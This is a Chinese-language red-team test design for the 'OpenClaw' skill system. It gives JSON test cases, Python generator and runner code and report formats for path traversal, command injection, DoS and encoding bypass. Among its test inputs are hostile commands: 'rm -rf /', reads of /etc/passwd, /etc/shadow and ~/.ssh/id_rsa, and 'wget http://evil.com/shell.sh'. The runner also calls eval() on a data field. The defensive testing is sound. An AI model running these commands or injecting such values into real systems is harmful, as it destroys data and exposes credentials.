# OpenClaw 自进化 MVP - Red Team Test Design

> 版本：1.0.0 | 最后更新：2026-02-02

## 1. Redteam 测试目标

Redteam 测试旨在验证技能在面对恶意输入时的安全性。这些测试模拟攻击者可能尝试的各种攻击向量。

### 1.1 测试覆盖范围

| 攻击类别 | 子类别 | 优先级 |
|----------|--------|--------|
| 代码注入 | 命令注入、Shell 展开 | P0 |
| 路径攻击 | 路径穿越、绝对路径 | P0 |
| 资源耗尽 | DoS、大输入、无限循环 | P1 |
| 数据泄露 | 敏感文件访问 | P1 |
| 编码绕过 | Null 字节、Unicode 规范化 | P2 |

---

## 2. 攻击向量详解

### 2.1 路径穿越（Path Traversal）

#### 攻击原理
通过 `../` 或 `..\\` 访问预期目录之外的文件。

#### 测试用例

```json
// 基础穿越
{
  "id": "redteam_path_001",
  "attack_vector": "path_traversal",
  "input": "../../../etc/passwd",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["root:", "/etc/", "passwd", "shadow"]
}

// 编码绕过尝试
{
  "id": "redteam_path_002",
  "attack_vector": "path_traversal_encoded",
  "input": "..%2F..%2F..%2Fetc%2Fpasswd",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["root:", "/etc/"]
}

// 双重编码
{
  "id": "redteam_path_003",
  "attack_vector": "path_traversal_double_encoded",
  "input": "..%252F..%252F..%252Fetc%252Fpasswd",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["root:", "/etc/"]
}

// Windows 风格
{
  "id": "redteam_path_004",
  "attack_vector": "path_traversal_windows",
  "input": "..\\..\\..\\windows\\system32\\config\\sam",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["windows", "system32", "sam"]
}

// 混合斜杠
{
  "id": "redteam_path_005",
  "attack_vector": "path_traversal_mixed",
  "input": "..\\../..\\../etc/passwd",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["/etc/", "passwd"]
}
```

### 2.2 命令注入（Command Injection）

#### 攻击原理
在输入中嵌入 Shell 命令，期望被执行。

#### 测试用例

```json
// 分号注入
{
  "id": "redteam_cmd_001",
  "attack_vector": "command_injection_semicolon",
  "input": "input.mp4; rm -rf /",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": [";", "rm", "-rf"]
}

// 管道注入
{
  "id": "redteam_cmd_002",
  "attack_vector": "command_injection_pipe",
  "input": "input.mp4 | cat /etc/passwd",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["|", "cat", "/etc/"]
}

// 后台执行
{
  "id": "redteam_cmd_003",
  "attack_vector": "command_injection_background",
  "input": "input.mp4 & wget http://evil.com/shell.sh",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["&", "wget", "http://"]
}

// 命令替换
{
  "id": "redteam_cmd_004",
  "attack_vector": "command_substitution",
  "input": "$(cat /etc/passwd).mp4",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["$(", ")", "cat", "/etc/"]
}

// 反引号替换
{
  "id": "redteam_cmd_005",
  "attack_vector": "command_substitution_backtick",
  "input": "`cat /etc/passwd`.mp4",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["`", "cat", "/etc/"]
}

// 换行注入
{
  "id": "redteam_cmd_006",
  "attack_vector": "command_injection_newline",
  "input": "input.mp4\nrm -rf /",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["rm", "-rf"]
}
```

### 2.3 资源耗尽（DoS）

#### 攻击原理
通过大输入或触发无限循环消耗系统资源。

#### 测试用例

```json
// 大字符串
{
  "id": "redteam_dos_001",
  "attack_vector": "large_input",
  "input_generator": "repeat('A', 10_000_000)",
  "expected_behavior": "timeout_or_reject",
  "timeout_ms": 5000
}

// 深层嵌套 JSON
{
  "id": "redteam_dos_002",
  "attack_vector": "nested_structure",
  "input_generator": "nested_dict(depth=1000)",
  "expected_behavior": "timeout_or_reject",
  "timeout_ms": 5000
}

// 正则回溯攻击（ReDoS）
{
  "id": "redteam_dos_003",
  "attack_vector": "regex_dos",
  "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
  "context": "技能使用 (a+)+ 类正则",
  "expected_behavior": "timeout_or_reject",
  "timeout_ms": 5000
}

// 大量小项目
{
  "id": "redteam_dos_004",
  "attack_vector": "many_items",
  "input_generator": "list(range(1_000_000))",
  "expected_behavior": "timeout_or_reject",
  "timeout_ms": 5000
}
```

### 2.4 编码绕过

#### 攻击原理
使用特殊编码或字符绕过安全检查。

#### 测试用例

```json
// Null 字节截断
{
  "id": "redteam_encode_001",
  "attack_vector": "null_byte",
  "input": "safe.txt\u0000.exe",
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["\u0000", ".exe"]
}

// Unicode 规范化绕过
{
  "id": "redteam_encode_002",
  "attack_vector": "unicode_normalization",
  "input": "..／..／etc／passwd",  // 使用全角斜杠
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["/etc/", "passwd"]
}

// Homoglyph 攻击
{
  "id": "redteam_encode_003",
  "attack_vector": "homoglyph",
  "input": "ехес",  // 西里尔字母看起来像 exec
  "context": "检查是否被误识别为合法调用",
  "expected_behavior": "no_execution"
}

// 控制字符
{
  "id": "redteam_encode_004",
  "attack_vector": "control_characters",
  "input": "file\x08\x08\x08name.txt",  // 退格字符
  "expected_behavior": "reject_or_sanitize",
  "forbidden_in_output": ["\x08"]
}
```

### 2.5 信息泄露

#### 攻击原理
尝试通过技能获取敏感信息。

#### 测试用例

```json
// 环境变量泄露
{
  "id": "redteam_leak_001",
  "attack_vector": "env_leak",
  "input": {"text": "${HOME}"},
  "expected_behavior": "no_expansion",
  "forbidden_in_output": ["/home/", "/root/"]
}

// 错误信息泄露
{
  "id": "redteam_leak_002",
  "attack_vector": "error_leak",
  "input": {"filename": "/nonexistent/path/file.txt"},
  "expected_behavior": "safe_error",
  "forbidden_in_output": ["stack trace", "line", "File \""]
}
```

---

## 3. Redteam 测试实现

### 3.1 测试生成器

```python
# src/eval/redteam_generator.py

def generate_large_input(size: int) -> str:
    """生成大字符串输入"""
    return "A" * size

def generate_nested_dict(depth: int) -> dict:
    """生成深层嵌套字典"""
    result = {"value": "leaf"}
    for _ in range(depth):
        result = {"nested": result}
    return result

def generate_redteam_inputs(attack_vector: str) -> list[dict]:
    """根据攻击向量生成测试输入"""
    generators = {
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "/etc/shadow",
            "~/.ssh/id_rsa",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "& wget http://evil.com",
            "$(whoami)",
            "`id`",
            "\nrm -rf /",
            "\r\nrm -rf /",
        ],
        "null_byte": [
            "safe.txt\x00.exe",
            "file\x00name",
        ],
        # ... 更多向量
    }
    return generators.get(attack_vector, [])
```

### 3.2 测试执行器

```python
# src/eval/redteam_runner.py

class RedteamRunner:
    def __init__(self, skill_dir: Path, timeout_ms: int = 5000):
        self.skill_dir = skill_dir
        self.timeout_ms = timeout_ms
    
    def run_attack(self, case: dict) -> RedteamResult:
        """执行单个 redteam 测试"""
        
        # 1. 准备输入
        if "input_generator" in case:
            input_data = eval(case["input_generator"])
        else:
            input_data = case["input"]
        
        # 2. 在沙盒中执行
        runner = SandboxRunner(timeout=self.timeout_ms)
        passed, logs, metrics = runner.run_with_input(
            self.skill_dir, 
            input_data
        )
        
        # 3. 检查输出是否包含禁止内容
        output_safe = True
        violations = []
        
        for forbidden in case.get("forbidden_in_output", []):
            if forbidden in logs:
                output_safe = False
                violations.append(f"Found forbidden pattern: {forbidden}")
        
        # 4. 检查行为
        behavior_ok = self._check_behavior(
            case["expected_behavior"],
            passed,
            logs,
            metrics
        )
        
        return RedteamResult(
            case_id=case["id"],
            attack_vector=case["attack_vector"],
            passed=output_safe and behavior_ok,
            violations=violations,
            logs=logs[:1000]  # 截断日志
        )
    
    def _check_behavior(self, expected: str, passed: bool, logs: str, metrics: dict) -> bool:
        """检查行为是否符合预期"""
        match expected:
            case "reject_or_sanitize":
                # 要么拒绝执行，要么输出不包含危险内容
                return True  # 由 forbidden_in_output 检查
            
            case "timeout_or_reject":
                # 应该超时或明确拒绝
                return not passed or metrics.get("duration_ms", 0) >= self.timeout_ms
            
            case "no_execution":
                # 不应该执行任何危险操作
                return "EXECUTION_BLOCKED" in logs or not passed
            
            case "safe_error":
                # 错误信息不应包含敏感信息
                return "Traceback" not in logs
            
            case _:
                return True
```

---

## 4. Redteam 报告格式

### 4.1 单次测试报告

```json
{
  "case_id": "redteam_path_001",
  "skill": "safe_filename_normalize",
  "attack_vector": "path_traversal",
  "input": "../../../etc/passwd",
  "result": {
    "passed": true,
    "output": "etc_passwd",
    "violations": [],
    "duration_ms": 12
  },
  "verdict": "SECURE"
}
```

### 4.2 汇总报告

```json
{
  "skill": "safe_filename_normalize",
  "version": "1.0.0",
  "timestamp": "2026-02-01T10:00:00Z",
  "summary": {
    "total": 15,
    "passed": 15,
    "failed": 0,
    "pass_rate": 1.0
  },
  "by_vector": {
    "path_traversal": {"total": 5, "passed": 5},
    "command_injection": {"total": 6, "passed": 6},
    "null_byte": {"total": 2, "passed": 2},
    "dos": {"total": 2, "passed": 2}
  },
  "failed_cases": [],
  "verdict": "PASS"
}
```

---

## 5. Redteam 最佳实践

### 5.1 测试原则

1. **假设攻击者了解系统**：不依赖于"隐藏"的安全机制
2. **覆盖已知攻击向量**：OWASP Top 10 相关项
3. **组合攻击**：测试多个攻击向量的组合
4. **边界测试**：测试边界条件（空、null、超大）
5. **回归测试**：每次安全修复后添加对应测试

### 5.2 失败处理

当 Redteam 测试失败时：

1. **立即阻止晋升**：技能不能进入 prod
2. **记录详细信息**：攻击向量、输入、输出、违规点
3. **通知机制**：（post-MVP）告警相关人员
4. **修复后重测**：修复必须通过所有 redteam 测试

### 5.3 持续更新

- 定期审查新出现的攻击技术
- 从真实安全事件中学习并添加测试
- 参考 CVE 数据库中的相关漏洞

---

## 6. MVP Redteam 检查清单

在 MVP 中，至少覆盖以下测试：

- [ ] 路径穿越 - Unix 风格（`../`）
- [ ] 路径穿越 - Windows 风格（`..\\`）
- [ ] 绝对路径访问（`/etc/passwd`）
- [ ] 命令注入 - 分号（`; cmd`）
- [ ] 命令注入 - 管道（`| cmd`）
- [ ] 命令替换（`$(cmd)` 和 `` `cmd` ``）
- [ ] Null 字节截断
- [ ] 大输入 DoS（1MB+）
- [ ] 深层嵌套结构
